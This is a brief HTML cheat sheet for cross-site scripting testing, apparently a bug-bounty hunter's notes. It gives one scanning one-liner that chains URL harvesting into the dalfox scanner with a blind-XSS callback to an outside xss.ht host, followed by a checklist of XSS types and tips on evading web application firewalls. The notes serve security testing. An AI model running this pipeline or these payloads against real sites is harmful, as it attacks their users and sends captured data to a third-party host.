<h1>XSS</h1>

<h3>Automated tool</h3>
<p><code>waybackurls @ | gf xss | qsreplace -a | Gxss | dalfox pipe -b angelito001.xss.ht -F | grep '[POC]' | notify -provider-config provider-config.yaml</code></p>

<h4>To test:</h4>
<ul>
  <li>SVG, HTML, JS, XML and CSS Files with payloads.</li>
  <li>DOM xss</li>
  <li>HTML Injection - Tool Gxss</li>
  <li>Stored xss</li>
  <li>Reflected xss</li>
</ul>

<h5>Evasion WAF</h5>
<p>Test: §TEST§ adding: </p>
<p>All tags with html.</p>
<p>+ Tag add events.</p>
